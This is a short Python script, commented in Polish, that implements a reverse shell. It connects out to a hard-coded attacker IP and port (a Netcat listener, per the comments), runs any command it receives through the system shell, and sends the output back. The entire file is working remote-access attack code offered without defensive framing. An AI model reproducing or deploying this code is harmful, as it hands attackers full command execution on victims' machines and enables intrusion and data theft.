import socket
import subprocess
import os

# IP serwera atakującego (Twojego serwera Netcat)
SERVER_HOST = '172.25.211.40'
# Port na serwerze atakującym, na którym jest uruchomiony Netcat
SERVER_PORT = 1234

# Tworzenie socketu
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Nawiązanie połączenia z atakującym
sock.connect((SERVER_HOST, SERVER_PORT))

# Utworzenie reverse shell
while True:
    # Odbiór komendy od serwera
    command = sock.recv(1024).decode()
    if command.lower() == 'exit':
        # Zamknij połączenie, jeśli komenda to 'exit'
        break
    if command.startswith("cd "):
        # Zmiana katalogu, jeśli komenda zaczyna się od 'cd'
        os.chdir(command.strip("cd "))
        sock.send(b'Changed directory')
    else:
        # Wykonaj komendę i wyślij wynik z powrotem
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

# Zamknięcie socketu
sock.close()
